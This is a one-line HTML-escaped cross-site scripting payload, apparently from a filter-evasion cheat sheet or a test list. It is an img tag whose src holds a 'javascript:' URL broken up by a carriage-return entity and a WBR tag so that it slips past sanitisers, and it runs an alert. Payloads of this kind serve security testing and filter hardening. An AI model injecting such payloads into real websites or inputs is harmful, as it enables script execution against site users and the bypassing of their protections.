&lt;img src="jav&amp;#x0D;ascript:alert(&lt;WBR&gt;'XSS');"&gt;
